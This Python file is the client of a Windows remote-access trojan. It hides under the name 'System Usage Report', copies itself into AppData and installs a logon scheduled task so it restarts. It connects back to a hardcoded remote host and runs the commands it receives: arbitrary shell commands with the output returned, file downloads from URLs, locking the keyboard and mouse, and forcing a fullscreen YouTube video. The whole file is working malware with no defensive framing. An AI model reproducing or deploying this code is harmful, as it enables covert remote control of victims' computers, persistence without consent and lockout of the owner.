from shutil import copyfile
import subprocess
import keyboard
import ctypes
import requests
import socket
import os
import sys
import threading
import mouse
import time

key = 'unCOFX0GP3tnnQW5bkQbxgY5ZNe2mATM'
timeout = 60

host = 'hiddenname.keenetic.pro'
port = 3142

app_name = 'System Usage Report'

mouse_blocking = False
keyboard_blocking = False


def connect():
    try:
        print('Connecting...')
        client.connect((host, port))
        client.send(str.encode(key, 'utf-8'))
        print('Successful connected!')
    except socket.error:
        print(f'Connection refused. Reconnect in {timeout} seconds...')
        time.sleep(timeout)
        connect()


def disconnect():
    client.close()
    print('Connection closed')


def send(data):
    client.send(bytes(data + '\n', 'utf-8'))


def run_cmd_command(cmd):
    proc = subprocess.Popen(cmd, shell=True, cwd=get_working_dir(), stdin=subprocess.DEVNULL,
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = proc.communicate()
    proc.wait()

    out_data = stdout.decode('cp866')

    if len(out_data) == 0:
        out_data = stderr.decode('cp866')

    return out_data + 'OK'


def download_file(url, filename):
    r = requests.get(url, allow_redirects=True)
    open(filename, 'wb').write(r.content)
    return 'OK'


def download_cmd_process(cmd):
    params = cmd[9:].split()
    if len(params) == 0:
        return 'Specify the url and then the filename'
    elif len(params) == 1:
        return 'Specify the filename'
    else:
        return download_file(params[0], params[1])


def get_working_dir():
    username = os.getlogin()
    return f'C:\\Users\\{username}\\AppData\\Local\\Programs'


def create_startup_task(working_dir):
    if not (app_name in run_cmd_command(fr'SCHTASKS /Query /TN "{app_name}"')):
        run_cmd_command(fr'SCHTASKS /CREATE /SC ONLOGON /TN "{app_name}" /TR "{working_dir}"')


def add_to_startup():
    working_dir = get_working_dir() + f'\\{app_name}' + '.exe'

    if not os.path.isfile(working_dir):
        copyfile(os.getcwd() + f'\\{app_name}' + '.exe', working_dir)
        create_startup_task(working_dir)
        print('Program was added to startup')

        subprocess.Popen([working_dir])
        ctypes.windll.user32.MessageBoxW(0, "Success", "Successfully added to startup", 0)
        sys.exit()
    else:
        print('Program have already added in startup')


def block_keyboard():
    global keyboard_blocking
    if not keyboard_blocking:
        for i in range(110):
            keyboard.block_key(i)
        keyboard_blocking = True
        return 'OK'
    else:
        return 'Keyboard was already blocked'


def unblock_keyboard():
    global keyboard_blocking
    if keyboard_blocking:
        for i in range(110):
            keyboard.unblock_key(i)
        keyboard_blocking = False
        return 'OK'
    else:
        return "Keyboard isn't blocking"


def keyboard_cmd_process(cmd):
    if 'unblock' in cmd:
        return unblock_keyboard()
    elif 'block' in cmd:
        return block_keyboard()
    else:
        return 'Specify the action'


def block_mouse():
    global mouse_blocking
    mouse_blocking = True
    while mouse_blocking:
        mouse.move(10000, 10000, absolute=True, duration=0)


def unblock_mouse():
    global mouse_blocking
    mouse_blocking = False


def mouse_cmd_process(cmd):
    if 'unblock' in cmd:
        if mouse_blocking:
            threading.Thread(target=unblock_mouse).start()
            return 'OK'
        else:
            return "Mouse isn't blocking"
    elif 'block' in cmd:
        if mouse_blocking:
            return 'Mouse was already blocked'
        else:
            threading.Thread(target=block_mouse).start()
            return 'OK'
    else:
        return 'Specify the action'


def open_youtube(cmd):
    run_cmd_command(f'start chrome {cmd[9:]}')
    time.sleep(15)
    keyboard.send('f')
    time.sleep(0.2)
    mouse_cmd_process('block')
    keyboard_cmd_process('block')
    return 'OK'


def close_program():
    keyboard.send('alt+f4')
    return 'OK'


add_to_startup()

while True:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect()

    while True:
        try:
            msg = client.recv(1024)

            if len(msg) <= 0:
                break

            command = msg.decode('utf-8')

            if command.startswith('cmd'):
                send(run_cmd_command(command[4:]))
            elif command.startswith('download'):
                send(download_cmd_process(command))
            elif command.startswith('keyboard'):
                send(keyboard_cmd_process(command))
            elif command.startswith('mouse'):
                send(mouse_cmd_process(command))
            elif command.startswith('youtube'):
                send(open_youtube(command))
            elif command.startswith('close'):
                send(close_program())
            elif command == 'ping':
                send('pong')
            else:
                send('Unknown command')
        except socket.error as e:
            print(str(e))
            break

    disconnect()
